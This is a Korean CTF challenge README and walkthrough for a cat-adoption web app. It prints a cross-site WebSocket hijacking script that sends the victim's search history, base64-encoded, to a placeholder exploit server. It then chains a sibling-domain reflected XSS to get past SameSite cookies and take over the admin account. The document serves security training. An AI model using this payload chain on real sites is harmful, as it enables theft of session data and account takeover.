# Cat-Distribution-System
To adopt kitties ₍^. .^₎⟆
<br><br>

## 페이지 구성
- home 페이지에서 입양할 고양이 확인 가능(고양이 클릭하면 세부정보 알 수 있음)
- 우상단에 Login 클릭 시 로그인 페이지로 연결
- Search 기능이 있음 (취약점 있는 부분)
- 전체 Search History를 반환하는 기능 구현
<br>

## 문제 풀이 시나리오
### 1. 검색 기능 분석
- 무언가를 검색하면 검색 기록도 반환됨
- 검색 기록은 유저 아이디에 따라 반환
- 개발자 툴을 통해 살펴보면 웹 소켓 핸드셰이크를 찾을 수 있음
- 요청에 예측 불가능한 토큰이 없기 때문에 CSWSH 취약점의 가능성 확인 가능
- 페이지 새로고침 시 클라이언트가 READY 메시지를 서버에 보내고 서버는 검색 기록으로 응답
### 2. CSWSH 취약점 확인
- search.js에서 코드 확인하고
- 공격 스크립트 작성해 익스플로잇 서버 통해 보내기
- 스크립트 실행 시 새 웹소켓 연결이 생성되고 검색 기록이 유출됨
    <script>
        let newWebSocket = new WebSocket("ws://localhost:5000/search");
        newWebSocket.onopen = function () {
            newWebSocket.send("READY");
        };

        newWebSocket.onmessage = function (event) {
        var message = event.data;
        fetch(
            "{익스플로잇서버주소}message?=" + btoa(message) //base64인코딩
        );
        };
    </script>
- 하지만 세션 쿠키가 포함되지 않기 때문에 새 세션의 검색 기록만 얻을 수 있음
- 확인해보면 서버가 SameSite=Strict이기 때문에 크로스사이트 요청에 쿠키를 보내지 않음을 확인할 수 있음
### 3. sibling domain에서 추가 취약점 발견
- Access-Control-Allow-Origin 을 통해 sibling domain 있는 것 확인
- 해당 페이지에 접속해보면 로그인 폼을 확인할 수 있음
- username 파라미터가 응답에 반영되는 reflected XSS 취약점이 있는 것을 확인할 수 있음
- POST 요청을 GET으로 변환해도 XSS가 동작하여 URL로 직접 공격 코드 삽입 가능
- sibling 도메인이 같은 사이트로 간주되어 SameSite 쿠키 제한 우회에 이용 가능
### 5. sibling domain을 통해 SameSite restriction 우회
- 기존 CSWSH 스크립트를 URL 인코딩하여 username 파라미터에 삽입
- 익스플로잇 서버에 그 url로 리다이렉트하는 스크립트 생성
    => 전체 검색 기록이 유출됨
### 6. 전송된 메시지 분석해서 admin 정보 획득
- 로그인 하면 성공
